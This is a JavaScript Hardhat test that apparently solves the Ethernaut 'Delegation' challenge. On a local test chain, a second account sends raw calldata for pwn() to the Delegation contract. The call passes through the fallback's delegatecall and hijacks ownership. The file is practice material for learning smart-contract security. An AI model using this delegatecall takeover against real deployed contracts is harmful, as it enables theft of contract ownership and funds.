const { expect } = require("chai");
const { keccak256 } = require("ethers/lib/utils");
const { ethers, waffle } = require("hardhat");
// Get the abi from artifacts
const { abi } = require('../artifacts/contracts/6. Delegation/Delegation.sol/Delegate.json')

describe("Delegation", function () {
  it("Should claim ownership", async function () {
    const [deployer, eoa] = await ethers.getSigners()
    const Delegate = await ethers.getContractFactory("Delegate")
    const delegate = await Delegate.deploy(deployer.address)
    await delegate.deployed()

    const Delegation = await ethers.getContractFactory("Delegation")
    const delegation = await Delegation.deploy(delegate.address)
    await delegation.deployed()


    // const methodHash = ethers.utils.keccak256("pwn()")
    // console.log(methodHash)

    // console.log(methodHash)



    const iface = new ethers.utils.Interface(abi);
    let encoded = iface.encodeFunctionData("pwn");
    console.log(ethers.utils.zeroPad(encoded, 65))

    let tx = await eoa.sendTransaction({
      to: delegation.address,
      from: eoa.address,
      data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
    })

    const owner1 = await delegate.owner()
    console.log(owner1)
    const owner = await delegation.owner()
    console.log(owner)
    console.log(eoa.address)
  });
});
